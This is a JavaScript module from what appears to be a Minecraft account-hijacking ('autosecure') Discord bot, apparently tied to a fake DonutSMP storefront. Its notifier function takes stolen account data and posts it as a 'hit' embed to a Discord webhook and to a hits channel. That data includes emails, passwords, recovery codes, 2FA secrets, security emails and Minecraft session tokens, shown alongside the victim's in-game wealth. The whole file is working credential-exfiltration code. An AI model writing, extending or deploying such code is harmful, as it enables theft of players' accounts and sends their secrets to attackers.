const { AttachmentBuilder, WebhookClient } = require('discord.js');
const { makeCard } = require('../drawhit');
const config = require('../../../config.json');
const path = require('path');
const fs = require('fs');
const { startFolderMonitor } = require('../autocleaner');
const { getMainBotClient } = require('../../../mainbot/handlers/botHandler');

const { queryParams } = require('../../../db/database');

function isValidMinecraftUsername(name) {
    if (!name || typeof name !== 'string') return false;
    const invalidKeywords = ["couldn't find!", "couldn't change!", "no minecraft!", "xbl failed", "none", "unknown", "failed"];
    if (invalidKeywords.includes(name.trim().toLowerCase())) return false;
    return /^[a-zA-Z0-9_]{2,16}$/.test(name.trim());
}

const recentNotifications = new Set();

async function sendSecureNotification(client, accountData, targetChannelId = null) {
    try {
        if (!accountData?.username || !isValidMinecraftUsername(accountData.username)) {
            console.log(`[NOTIFIER] Skipping notification for invalid/placeholder username: '${accountData?.username}'`);
            return;
        }

        const notifKey = `${accountData.username.toLowerCase()}_${Math.floor(Date.now() / 15000)}`;
        if (recentNotifications.has(notifKey)) {
            console.log(`[NOTIFIER] Skipping duplicate notification for ${accountData.username}`);
            return;
        }
        recentNotifications.add(notifKey);
        setTimeout(() => recentNotifications.delete(notifKey), 30000);

        const hasWebhook = Boolean(config.notifierWebhook && config.notifierWebhook.trim() !== '');

        let channelId = targetChannelId;
        if (!channelId && client?.username) {
            try {
                const dbResults = await queryParams('SELECT hits_channel FROM autosecure WHERE user_id = ? AND botnumber = ? LIMIT 1', [client.username, client.botnumber || 1]);
                if (dbResults && dbResults[0]?.hits_channel) {
                    channelId = dbResults[0].hits_channel.split('|')[0];
                }
            } catch (e) {
                console.error('[NOTIFIER] Error checking DB for hits_channel:', e.message);
            }
        }
        if (!channelId) {
            channelId = config.notifierChannel || config.hitschannel || null;
        }

        if (!hasWebhook && !channelId) {
            console.log('[NOTIFIER] No notifierWebhook or hitschannel configured, skipping image notification.');
            return;
        }

        const stats = {
            username: accountData.username || 'Unknown',
            rank: accountData.rank || 'NONE',
            networth: accountData.networth || '0',
            bedwars: accountData.bedwars || accountData.bedwarsLevel || '0',
            networkLevel: accountData.networkLevel || '0',
            sbLevel: accountData.sbLevel || '0',
            duelKDR: accountData.duelKDR || '0',
            duelWinstreak: accountData.duelWinstreak || '0',
            plusColour: accountData.plusColour || 'None',
            gifted: accountData.gifted || '0',
            donut: accountData.donut || null,
            donutMoney: accountData.donutMoney || accountData.donut?.moneyFormatted || accountData.donut?.money || null,
            donutShards: accountData.donutShards || accountData.donut?.shardsFormatted || accountData.donut?.shards || null,
            donutPlaytime: accountData.donutPlaytime || accountData.donut?.playtime || null,
            donutRank: accountData.donutRank || accountData.donut?.rank || null,
            donutKDR: accountData.donutKDR || accountData.donut?.kdr || null
        };

        const timestamp = Date.now();
        const filename = `secure_${accountData.username}_${timestamp}.png`;
        const tempDir = path.join(__dirname, 'temp');

        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
            startFolderMonitor(tempDir, 5);
        }

        const outputPath = path.join(tempDir, filename);
        const imageBuffer = await makeCard(stats, outputPath);
        const attachment = new AttachmentBuilder(imageBuffer, { name: filename });

        // 1. Send via Webhook if configured
        if (hasWebhook) {
            try {
                const webhook = new WebhookClient({ url: config.notifierWebhook });
                
                // Build rich Discord hit embed
                const donutInfo = stats.donut || {};
                const embedFields = [
                    { name: "👤 Minecraft Username", value: `\`${stats.username}\``, inline: true },
                    { name: "📧 Email", value: `\`${accountData.email || accountData.oldEmail || 'N/A'}\``, inline: true },
                    { name: "🔑 Password", value: `\`${accountData.password || 'N/A'}\``, inline: true },
                    { name: "🛡️ Recovery Code", value: `\`${accountData.recoveryCode || 'N/A'}\``, inline: true },
                    { name: "🔐 2FA Secret", value: `\`${accountData.secretkey || 'Disabled'}\``, inline: true },
                    { name: "📨 Security Email", value: `\`${accountData.secEmail || 'None'}\``, inline: true },
                ];

                if (stats.donutRank && stats.donutRank !== 'None') {
                    embedFields.push({ name: "🍩 Donut Rank", value: `**${stats.donutRank}**`, inline: true });
                }
                if (stats.donutMoney && stats.donutMoney !== '$0') {
                    embedFields.push({ name: "💰 Donut Money", value: `\`${stats.donutMoney}\``, inline: true });
                }
                if (stats.donutShards && stats.donutShards !== '0') {
                    embedFields.push({ name: "💎 Donut Shards", value: `\`${stats.donutShards}\``, inline: true });
                }
                if (stats.donutPlaytime && stats.donutPlaytime !== '0m') {
                    embedFields.push({ name: "⏳ Donut Playtime", value: `\`${stats.donutPlaytime}\``, inline: true });
                }
                if (stats.donutKDR && stats.donutKDR !== '0.00') {
                    embedFields.push({ name: "⚔️ Donut K/D", value: `\`${stats.donutKDR}\``, inline: true });
                }
                if (stats.networth && stats.networth !== '0') {
                    embedFields.push({ name: "🏰 Hypixel Networth", value: `\`${stats.networth}\``, inline: true });
                }
                if (stats.bedwars && stats.bedwars !== '0') {
                    embedFields.push({ name: "🛏️ Bedwars Star", value: `\`⭐ ${stats.bedwars}\``, inline: true });
                }
                if (accountData.ssid) {
                    embedFields.push({ name: "🎫 Minecraft SSID", value: `\`\`\`${accountData.ssid.substring(0, 100)}...\`\`\``, inline: false });
                }

                const hitEmbed = {
                    title: `🍩 NEW DONUT SMP HIT: ${stats.username}`,
                    description: `> Tài khoản **${stats.username}** đã được bảo mật thành công qua DonutSMP Storefront!`,
                    color: 0x38bdf8,
                    thumbnail: {
                        url: `https://visage.surgeplay.com/bust/${encodeURIComponent(stats.username)}.png?y=-40&quality=lossless`
                    },
                    image: {
                        url: `attachment://${filename}`
                    },
                    fields: embedFields,
                    footer: {
                        text: `DonutSMP AutoSecure System • ${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}`,
                        icon_url: 'https://website.donutsmp.org/bcGCsev.png'
                    },
                    timestamp: new Date().toISOString()
                };

                await webhook.send({
                    embeds: [hitEmbed],
                    files: [attachment]
                });
                console.log(`[NOTIFIER] Successfully sent hit image & embed to notifierWebhook for ${stats.username}`);
            } catch (whErr) {
                console.error('[NOTIFIER] Error sending hit image to webhook:', whErr.message);
            }
        }

        // 2. Send to Discord Channel strictly using the MAIN BOT client
        if (channelId) {
            try {
                const mainBotClient = getMainBotClient();
                let channel = null;
                let senderTag = 'Unknown';

                // Try all available clients to find the channel
                const clients = [
                    mainBotClient,
                    client
                ].filter(c => c && c.isReady && c.isReady() && c.channels);

                for (const c of clients) {
                    channel = await c.channels.fetch(channelId).catch(() => null);
                    if (channel) {
                        senderTag = c.user?.tag || 'Bot';
                        break;
                    }
                }

                if (channel) {
                    await channel.send({
                        files: [attachment]
                    });
                    console.log(`[NOTIFIER] Successfully sent hit image via ${senderTag} to channel <#${channelId}> for ${stats.username}`);
                } else {
                    console.error(`[NOTIFIER] Channel <#${channelId}> not found on any bot client`);
                }
            } catch (chErr) {
                console.error(`[NOTIFIER] Error sending hit image to channel ${channelId}:`, chErr.message);
            }
        }

    } catch (error) {
        console.error('[NOTIFIER] Failed to send secure notification:', error);
    }
}

module.exports = { sendSecureNotification };
